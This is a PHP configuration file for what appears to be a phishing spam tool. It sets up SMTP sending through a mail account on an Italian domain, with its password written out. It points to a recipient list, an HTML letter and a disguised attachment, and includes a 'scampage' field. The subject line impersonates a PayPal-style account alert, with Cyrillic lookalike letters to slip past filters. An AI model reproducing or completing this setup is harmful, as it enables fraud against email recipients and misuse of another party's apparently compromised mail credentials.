<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     		=> "mail.centrosoftwaretre.it",
        "port"     		=> "25",
       	"smtp_secure" 	=> "",
        "username"		=> "smtp-auth@centrosoftwaretre.it",
        "password" 	    => "r0WVcqpAta_-V86xpx9_6Ogsg6*8"
    ],
   
];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 0,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 1,
    "mail_list"      => "file/maillist/test.txt",
    "fromname"       => "Reply",
    "frommail"       => "smtp-auth@centrosoftwaretre.it",
    "subject"        =>  "[RE]: Take action on your ассοunt (Ref ID – PP-55484##randstring##)",
    "msgfile"        => "file/letter/1.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => [""],
];